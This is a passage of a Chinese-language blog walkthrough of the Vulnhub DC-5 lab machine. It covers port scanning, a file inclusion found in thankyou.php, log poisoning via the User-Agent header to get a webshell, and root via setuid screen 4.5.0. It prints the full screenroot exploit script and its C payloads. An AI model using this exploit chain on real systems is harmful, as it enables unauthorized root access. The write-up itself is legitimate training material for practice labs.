@@ -1,0 +1,858 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [Vulnhub靶机通关]DC-5 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC]  外网渗透  主机发现+端口扫描 1nmap -sn 192.168.139.1&#x2F;24  详细信息扫描： 1nmap -sS -T5 -sC -p- --min-rate 10000 192.168.139.134     端口 状态 服务 版本&#x2F;详情     80&#x2F;tcp 开放 http Web服务器（标题为 “Welcome”）   111&#x2F;tcp 开放 rpcbind RPC端口">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Vulnhub靶机通关]DC-5">
+<meta property="og:url" content="http://example.com/2026/02/02/[Vulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3]DC-5/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC]  外网渗透  主机发现+端口扫描 1nmap -sn 192.168.139.1&#x2F;24  详细信息扫描： 1nmap -sS -T5 -sC -p- --min-rate 10000 192.168.139.134     端口 状态 服务 版本&#x2F;详情     80&#x2F;tcp 开放 http Web服务器（标题为 “Welcome”）   111&#x2F;tcp 开放 rpcbind RPC端口">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202231708040.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202231741851.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202231924142.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202233720799.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202234131440.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202233843428.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202233916391.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202233948284.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202234408608.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202234422079.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202234439725.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202234625559.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202235012685.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202235200767.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202235142366.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260202235650964.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260203000220600.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260203000400111.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/88a3cf63366b1e8fb4bd52e26c71a4a8.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260203000754726.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260203001044387.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260203001120372.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260203001220511.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260203001854930.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260203001924066.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260203001936562.png">
+<meta property="og:image" content="http://example.com/2026/02/02/images/image-20260203002030196.png">
+<meta property="article:published_time" content="2026-02-02T14:52:33.000Z">
+<meta property="article:modified_time" content="2026-02-02T16:29:20.476Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="Vulnhub">
+<meta property="article:tag" content="screen4.5.0提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/02/02/images/image-20260202231708040.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[Vulnhub靶机通关]DC-5">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[Vulnhub靶机通关]DC-5</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text"> 外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text"> 主机发现+端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.</span> <span class="toc-text"> 目录爆破-&gt;文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%ABgetshell"><span class="toc-number">1.3.</span> <span class="toc-text"> 日志包含getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text"> 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#screen-450%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text"> screen-4.5.0提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E5%86%99%E5%88%B0libhaxc%E5%B9%B6%E7%BC%96%E8%AF%91"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 将第一部分内容写到libhax.c并编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%E7%9A%84%E4%BB%A3%E7%A0%81%E5%86%99%E5%85%A5rootshellc%E5%B9%B6%E7%BC%96%E8%AF%91"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 将第二部分的代码写入rootshell.c并编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81%E5%86%99%E5%85%A5dc5sh%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.3.</span> <span class="toc-text"> 将第三部分代码写入dc5.sh文件</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[Vulnhub靶机通关]DC-5" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/02/02/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5DDC-5/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-02-02T14:52:33.000Z" itemprop="datePublished">2026-02-02</time>
+    <time style="display: none;" id="post-update-time">2026-02-03</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/" data-aos="zoom-in">渗透</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<h2 id="外网渗透"><a class="markdownIt-Anchor" href="#外网渗透"></a> 外网渗透</h2>
+<h3 id="主机发现端口扫描"><a class="markdownIt-Anchor" href="#主机发现端口扫描"></a> 主机发现+端口扫描</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.139.1/24</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260202231708040.png" alt="image-20260202231708040" /></p>
+<p>详细信息扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T5 -sC -p- --min-rate 10000 192.168.139.134</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260202231741851.png" alt="image-20260202231741851" /></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">端口</th>
+<th style="text-align:left">状态</th>
+<th style="text-align:left">服务</th>
+<th style="text-align:left">版本/详情</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>80/tcp</strong></td>
+<td style="text-align:left"><strong>开放</strong></td>
+<td style="text-align:left"><strong>http</strong></td>
+<td style="text-align:left">Web服务器（标题为 “Welcome”）</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>111/tcp</strong></td>
+<td style="text-align:left">开放</td>
+<td style="text-align:left">rpcbind</td>
+<td style="text-align:left">RPC端口映射器 (版本 2,3,4)</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>39021/tcp</strong></td>
+<td style="text-align:left">开放</td>
+<td style="text-align:left">status</td>
+<td style="text-align:left">RPC <code>status</code> 服务 (版本 1)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="目录爆破-文件包含"><a class="markdownIt-Anchor" href="#目录爆破-文件包含"></a> 目录爆破-&gt;文件包含</h3>
+<p><img src="../images/image-20260202231924142.png" alt="image-20260202231924142" /></p>
+<p><img src="../images/image-20260202233720799.png" alt="image-20260202233720799" /></p>
+<p><img src="../images/image-20260202234131440.png" alt="image-20260202234131440" /></p>
+<p>这里我扫目录，搜指纹都没找到什么利用点，看WP…佩服：<br />
+这里他们说在首页的时候是 2019：<br />
+<img src="../images/image-20260202233843428.png" alt="image-20260202233843428" /></p>
+<p>然后随便提交一个上去又变成了2018：<br />
+<img src="../images/image-20260202233916391.png" alt="image-20260202233916391" /></p>
+<p>一直刷新这个就会一直随机变化：<br />
+<img src="../images/image-20260202233948284.png" alt="image-20260202233948284" /></p>
+<p>得到的结论：<strong>thinkyou.php包含了footer.php文件，猜测存在文件包含</strong></p>
+<p>好细啊，想不到</p>
+<p>到了这里就有了两种思路：</p>
+<ul>
+<li>在thinkyou.php的基础上进行爆破(一般人想不到)</li>
+</ul>
+<p><img src="../images/image-20260202234408608.png" alt="image-20260202234408608" /></p>
+<p><img src="../images/image-20260202234422079.png" alt="image-20260202234422079" /></p>
+<p><img src="../images/image-20260202234439725.png" alt="image-20260202234439725" /></p>
+<ul>
+<li>直接猜文件包含参数（我用arjun没爆出来，是不是用错了）</li>
+</ul>
+<p><img src="../images/image-20260202234625559.png" alt="image-20260202234625559" /></p>
+<p>也不知道这后端咋写的</p>
+<h3 id="日志包含getshell"><a class="markdownIt-Anchor" href="#日志包含getshell"></a> 日志包含getshell</h3>
+<p>文件包含导致RCE一般就几种，但适用于实战的还得是日志文件包含</p>
+<p>首先我们得确认日志文件位置</p>
+<p>系统是Nginx，默认在<code>/var/log/nginx/access.log</code></p>
+<p><img src="../images/image-20260202235012685.png" alt="image-20260202235012685" /></p>
+<p>通过UA头写进去：<br />
+<img src="../images/image-20260202235200767.png" alt="image-20260202235200767" /></p>
+<p>直接包含：</p>
+<p><img src="../images/image-20260202235142366.png" alt="image-20260202235142366" /></p>
+<p>一开始我用哥斯拉连半天连不上</p>
+<p>用蚁剑连上去了</p>
+<p><img src="../images/image-20260202235650964.png" alt="image-20260202235650964" /></p>
+<p>还需要提权</p>
+<h2 id="后渗透"><a class="markdownIt-Anchor" href="#后渗透"></a> 后渗透</h2>
+<h3 id="screen-450提权"><a class="markdownIt-Anchor" href="#screen-450提权"></a> screen-4.5.0提权</h3>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/) $ find / -perm <span class="attr">-u</span>=s -type f <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>
+<p>发现**<code>/bin/screen-4.5.0</code> - 终端复用器**</p>
+<blockquote>
+<p>这里还发现了exim4，DC-4用过，这里就没试了</p>
+</blockquote>
+<blockquote>
+<p>发现screen-4.5.0，使用41145.sh脚本提权</p>
+<p>GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会</p>
+<p>话，并在其间自由切换。</p>
+<p>GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。</p>
+</blockquote>
+<p>按下面的操作进行提权：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查找提权脚本：</span></span><br><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260203000220600.png" alt="image-20260203000220600" /></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用第一个</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/41154.sh ./41154.sh</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260203000400111.png" alt="image-20260203000400111" /></p>
+<p>cat一下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/libhax.c</span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line"><span class="built_in">rm</span> -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span> <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+<p><img src="../images/88a3cf63366b1e8fb4bd52e26c71a4a8.png" alt="img" /></p>
+<h4 id="将第一部分内容写到libhaxc并编译"><a class="markdownIt-Anchor" href="#将第一部分内容写到libhaxc并编译"></a> 将第一部分内容写到libhax.c并编译</h4>
+<p>按照脚本提示，先将第一部分内容写到libhax.c中(一共有三个部分)<br />
+创建一个文件夹存放三个部分的脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir dc-5</span><br><span class="line">cd dc-5</span><br></pre></td></tr></table></figure>
+<p>创建libhax.c文件，用vim编辑，当然，也可以直接使用vim创建文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch libhax.c</span><br><span class="line">vim libhax.c</span><br></pre></td></tr></table></figure>
+<p>写入如下文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260203000754726.png" alt="image-20260203000754726" /></p>
+<p>将这个脚本编译为so文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260203001044387.png" alt="image-20260203001044387" /></p>
+<p>报错了</p>
+<p>少了个头文件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    